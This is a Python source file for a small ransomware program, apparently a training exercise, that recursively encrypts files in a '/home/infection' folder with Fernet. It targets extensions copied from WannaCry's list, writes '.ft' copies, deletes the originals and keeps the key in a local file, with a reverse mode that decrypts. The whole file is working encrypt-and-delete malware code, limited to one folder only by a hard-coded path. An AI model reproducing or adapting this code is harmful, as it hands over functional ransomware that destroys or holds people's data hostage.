from parse_args import parse_arguments
import os
import sys
import pathlib
from cryptography.fernet import Fernet

# list of file extensions affected by wannacry:
# https://gist.github.com/xpn/facb5692980c14df272b16a4ee6a29d5

extensions = ['.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt',
              '.ott', '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods',
              '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp',
              '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay',
              '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb',
              '.mdb', '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd',
              '.mdf', '.ldf', '.sln', '.suo', '.cs', '.c', '.cpp', '.pas',
              '.h', '.asm', '.js', '.cmd', '.bat', '.ps1', '.vbs', '.vb',
              '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp',
              '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf',
              '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov',
              '.mp4', '.3gp', '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u',
              '.m4u', '.djvu', '.svg', '.ai', '.psd', '.nef', '.tiff', '.tif',
              '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg', '.vcd',
              '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar',
              '.bak', '.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx',
              '.vmdk', '.vdi', '.sldm', '.sldx', '.sti', '.sxi', '.602',
              '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks',
              '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml',
              '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx',
              '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm',
              '.xltx', '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm',
              '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb',
              '.docx', '.doc']


def generate_encryption_key(silent):
    if os.path.isfile("key.key"):
        try:
            with open("key.key", "rb") as f:
                encryption_key = f.read()
            return encryption_key
        except Exception as e:
            if not silent:
                print(f"Error recovering encryption key: {e}", file=sys.stderr)
            return
    encryption_key = Fernet.generate_key()
    try:
        with open("key.key", "wb") as f:
            f.write(encryption_key)
        return encryption_key
    except Exception as e:
        if not silent:
            print(f"Error with the encryption key: {e}",
                  file=sys.stderr)
        return


def encrypt_files(root, key, silent):
    cipher = Fernet(key)
    for path, subdirs, files in os.walk(root):
        for file in files:
            filepath = pathlib.PurePath(path, file)
            if filepath.suffix in extensions:
                try:
                    with open(filepath, "rb") as f:
                        content = f.read()
                    content = cipher.encrypt(content)
                    with open(str(filepath) + ".ft", "wb") as f:
                        f.write(content)
                    os.remove(filepath)
                    if not silent:
                        print(f"Encrypted: {filepath}")
                except Exception as e:
                    if not silent:
                        print(f"Error when ecrypting files {filepath}: {e}",
                              file=sys.stderr)
        for subdir in subdirs:
            encrypt_files(subdir, key, silent)


def decrypt_files(root, key, silent):
    cipher = Fernet(key)
    for path, subdirs, files in os.walk(root):
        for file in files:
            filepath = pathlib.PurePath(path, file)
            if filepath.suffix == ".ft":
                try:
                    with open(filepath, "rb") as f:
                        content = f.read()
                    content = cipher.decrypt(content)
                    with open(str(filepath)[:-3], "wb") as f:
                        f.write(content)
                    os.remove(filepath)
                    if not silent:
                        print(f"Decrypted: {filepath}")
                except Exception as e:
                    if not silent:
                        print(f"Error when decrypting files {filepath}: {e}",
                              file=sys.stderr)
        for subdir in subdirs:
            decrypt_files(subdir, key, silent)


def main():
    args = parse_arguments()
    root = "/home/infection"
    if not os.path.isdir(root):
        if not args.silent:
            print("Error: infection folder not found in home", file=sys.stderr)
        return
    if args.reverse:
        decrypt_files(root, args.reverse, args.silent)
    else:
        key = generate_encryption_key(args.silent)
        encrypt_files(root, key, args.silent)


if __name__ == "__main__":
    main()
